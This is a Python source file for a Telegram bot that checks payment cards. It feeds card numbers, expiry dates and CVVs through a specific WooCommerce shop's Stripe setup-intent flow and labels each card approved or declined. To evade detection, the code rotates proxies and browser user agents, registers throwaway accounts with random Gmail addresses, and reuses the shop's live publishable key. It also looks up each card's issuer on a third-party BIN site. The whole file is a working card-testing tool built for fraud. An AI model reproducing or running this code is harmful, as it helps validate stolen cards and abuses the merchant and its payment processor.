# gateways.py

import re
import requests
import random
import asyncio
from datetime import datetime
from telegram import Update
from telegram.ext import ContextTypes

# --- Proxy Setup ---
def load_proxies(filename="proxies.txt"):
    with open(filename) as f:
        return [l.strip() for l in f if l.strip()]

proxy_list = load_proxies()
bad_proxies = set()

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
]

kk = "qwertyuiolmkjnhbgvfcdxszaQWEAERSTSGGZJDNFMXLXLVKPHPY1910273635519"

def get_random_proxy():
    good_proxies = [p for p in proxy_list if p not in bad_proxies]
    if not good_proxies:
        good_proxies = proxy_list.copy()
        bad_proxies.clear()
    proxy_str = random.choice(good_proxies)
    host, port, user, pwd = proxy_str.split(":")
    proxy_fmt = f"http://{user}:{pwd}@{host}:{port}"
    return proxy_str, {"http": proxy_fmt, "https": proxy_fmt}

def get_random_email():
    chars = "abcdefghijklmnopqrstuvwxyz1234567890"
    return "".join(random.choice(chars) for _ in range(random.randint(13,18))) + "@gmail.com"

def get_random_ua():
    return random.choice(user_agents)

def extract_cc(text):
    return re.findall(r"\b\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b", text)

def get_bin_info(bin_number):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            line = resp.text.strip().split('\n')[0]
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 6:
                scheme = parts[1]
                typ = parts[2]
                country = parts[4]
                issuer = parts[3]
                card_type = f"{typ.upper()} - {scheme.upper()}"
                return {
                    "country": country,
                    "issuer": issuer,
                    "type": card_type
                }
    except Exception as e:
        print("BIN lookup error:", e)
    return {
        "country": "UNKNOWN",
        "issuer": "UNKNOWN",
        "type": "UNKNOWN"
    }

def format_cc_result(ccx, status, site_response, bin_info, country, issuer, card_type, user_first_name):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return (
        f"[ϟ] 𝗖𝗖 - <code>{ccx}</code>\n"
        f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status}\n"
        f"[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {site_response}\n"
        f"[ϟ] 𝗚𝗮𝘁𝗲 - Stripe Auth\n"
        f"━━━━━━━━━━━━━\n"
        f"[ϟ] 𝗕𝗶𝗻 : <code>{bin_info}</code>\n"
        f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country}\n"
        f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : {issuer}\n"
        f"[ϟ] 𝗧𝘆𝗽𝗲 : {card_type}\n"
        f"━━━━━━━━━━━━━\n"
        f"[ϟ] 𝗧𝗶𝗺𝗲 : {now}\n"
        f"[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : <b>{user_first_name}</b>"
    )

def stripe_check(ccx, max_attempts=6):
    last_err = None
    for attempt in range(max_attempts):
        proxy_str, proxy = get_random_proxy()
        try:
            def get_fresh_session():
                s = requests.session()
                s.proxies = proxy
                email = get_random_email()
                headers = {
                    "User-Agent": get_random_ua(),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "accept-language": "en-US,en;q=0.9,ar;q=0.8",
                }
                url = "https://infiniteautowerks.com/my-account/"
                resp = s.get(url, headers=headers, timeout=18)
                try:
                    nonce = resp.text.split('name="woocommerce-register-nonce" value=')[1].split('"')[1]
                except Exception:
                    return None, None, None

                payload = {
                    "email": email,
                    "woocommerce-register-nonce": nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register",
                }
                s.post(url, data=payload, headers=headers, cookies=s.cookies, timeout=18)
                return s, headers, s.cookies

            def get_payment_nonce(session, headers, cookies):
                url = "https://infiniteautowerks.com/my-account/add-payment-method/"
                resp = session.get(url, headers=headers, cookies=cookies, timeout=18)
                try:
                    nonce1 = resp.text.split('createAndConfirmSetupIntentNonce":')[1].split('"')[1]
                except Exception:
                    return None
                return nonce1

            session, headers, cookies = get_fresh_session()
            if session is None:
                bad_proxies.add(proxy_str)
                last_err = "Session setup failed."
                continue
            nonce1 = get_payment_nonce(session, headers, cookies)
            if nonce1 is None:
                bad_proxies.add(proxy_str)
                last_err = "Payment nonce setup failed."
                continue

            try:
                cc = ccx.split("|")[0]
                exp = ccx.split("|")[1]
                exy = ccx.split("|")[2]
                if len(exy) == 4:
                    exy = exy[2:]
                ccv = ccx.split("|")[3]
            except:
                return "Error: Card format.", "Error: Invalid card format."

            url = "https://api.stripe.com/v1/payment_methods"
            payload = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": ccv,
                "card[exp_year]": exy,
                "card[exp_month]": exp,
                "allow_redisplay": "unspecified",
                "billing_details[address][country]": "EG",
                "payment_user_agent": "stripe.js/d16ff171ee; stripe-js-v3/d16ff171ee; payment-element; deferred-intent",
                "referrer": "https://infiniteautowerks.com",
                "time_on_page": "19537",
                "client_attribution_metadata[client_session_id]": "8a3d508b-f6ba-4f16-be66-c59232f6afc0",
                "key": "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae",
                "_stripe_version": "2024-06-20",
            }
            stripe_headers = {
                "User-Agent": get_random_ua(),
                "Accept": "application/json",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "accept-language": "en-US,en;q=0.9,ar;q=0.8",
            }

            response = session.post(url, data=payload, headers=stripe_headers, timeout=18)
            try:
                tok = response.json()["id"]
            except Exception as e:
                error_msg = response.json().get("error", {}).get("message", str(e))
                bad_proxies.add(proxy_str)
                last_err = error_msg
                continue

            url = "https://infiniteautowerks.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            payload = {
                "action": "create_and_confirm_setup_intent",
                "wc-stripe-payment-method": tok,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": nonce1,
            }
            confirm_headers = {
                "User-Agent": get_random_ua(),
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://infiniteautowerks.com",
                "referer": "https://infiniteautowerks.com/my-account/add-payment-method/",
                "accept-language": "en-US,en;q=0.9,ar;q=0.8",
            }
            resp = session.post(url, data=payload, headers=confirm_headers, cookies=cookies, timeout=18)
            txt = resp.text

            # Analyze response and message
            if "succeeded" in txt:
                return "APPROVED ✅", "Payment method successfully added ✅"
            elif "insufficient funds" in txt:
                return "APPROVED ✅", "Payment method successfully added ✅ (insufficient funds)"
            elif "incorrect_cvc" in txt or "security code is incorrect" in txt:
                return "DECLINED ❌", "Incorrect CVC"
            elif "card was declined" in txt:
                return "DECLINED ❌", "Card was declined"
            elif "error" in txt.lower() or "blocked" in txt.lower():
                bad_proxies.add(proxy_str)
                last_err = txt.strip()[:120]
                continue
            else:
                return "DECLINED ❌", (txt.strip()[:120] if txt else "Unknown site response.")
        except Exception as err:
            bad_proxies.add(proxy_str)
            last_err = str(err)
            continue
    return "DECLINED ❌", f"Proxy error, last: {last_err}"

# --- TELEGRAM HANDLER ---
async def handle_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(
            "Usage: <code>/chk xxxxxxxxxxxxxxxx|mm|yyyy|cvv</code>",
            parse_mode="HTML"
        )
        return
    text = " ".join(args)
    cc_list = extract_cc(text)
    if not cc_list:
        await update.message.reply_text("❗ No valid CC found in your input.")
        return

    user_first_name = update.effective_user.first_name

    for ccx in cc_list:
        checking_msg = await update.message.reply_text("🔄 <b>Checking card, please wait...</b>", parse_mode="HTML")
        await asyncio.sleep(random.uniform(1.5, 4.0))
        bin_info = ccx.split('|')[0][:6]
        bin_data = await asyncio.to_thread(get_bin_info, bin_info)
        status, site_response = await asyncio.to_thread(stripe_check, ccx)

        formatted_msg = format_cc_result(
            ccx=ccx,
            status=status,
            site_response=site_response,
            bin_info=bin_info,
            country=bin_data["country"],
            issuer=bin_data["issuer"],
            card_type=bin_data["type"],
            user_first_name=user_first_name
        )

        try:
            await checking_msg.edit_text(formatted_msg, parse_mode="HTML")
        except:
            await update.message.reply_text(formatted_msg, parse_mode="HTML")

# --- Braintree Stub (implement yourself) ---
async def handle_braintree(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Braintree Auth not implemented yet.")
